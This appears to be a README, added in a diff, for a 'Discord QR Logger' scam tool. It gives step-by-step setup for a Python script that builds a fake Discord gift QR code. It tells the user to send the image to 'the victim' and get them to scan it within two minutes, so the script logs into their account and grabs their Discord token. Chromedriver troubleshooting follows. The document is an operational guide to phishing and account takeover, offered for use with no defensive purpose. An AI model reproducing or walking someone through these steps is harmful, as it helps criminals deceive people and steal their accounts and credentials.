@@ -1,0 +1,56 @@
+https://github.com/NightfallGT/Discord-QR-Scam
+
+--Discord QR  Logger--
+
+This was rewritten credits to the original owner for source if you want the old source you can find it after launching the python script or inside of #README file inside of the zip
+
+
+Requirements:  Python 3.7.6
+
+
+How to setup?
+
+1. If you dont have python installed, download python 3.7.6
+and make sure you click on the 'ADD TO PATH' option during
+the installation.
+
+2. Install the required modules > 
+pip install -r requirements.txt
+
+ or double click pip_install_requirements.bat
+
+3. Type 
+python QR_Generator.py
+in cmd to run or double click run_generator.bat
+4. Wait for the discord_gift.png to be generated. Send the image to the victim and make them scan it.
+
+5. QR Code only lasts about 2 minutes. Make sure you send a fresh one to the victim and he is ready to scan.
+
+6. When the QR Code is scanned, you will automatically be logged in to their account and the script will grab the Discord token.
+
+## Troubleshoot
+Make sure your chromedriver.exe file is the same version as your current Chrome web browser version. To check your current Chrome version,
+paste 
+chrome://settings/help
+ in Google Chrome.
+
+if Chrome crashes,
+
+1. Make sure your chromedriver.exe file is the same version as your Chrome web browser version
+2. Download the latest version chromedriver.exe here: https://chromedriver.chromium.org/downloads
+3. Then replace the chromedriver.exe file in the folder.
+https://streamable.com/1xhufn
+Check INFO of users token and faster execution speeds!
+
+
+
+
+You may have issues when using this
+
+Noted issues:
+
+Make sure you have all the requirements inside of requirements.txt 
+
+If you don't get the response "waiting for user to scan" it's not functioning properly relaunch the python until it says "waiting for user to scan"
+
+If you close the chrome window when it's waiting for the user to scan it'll prompt an error saying that the window was closed and it will no longer function properly reopen your window and ensure both your chrome window and python is open at all times otherwise you will be prompted an error.
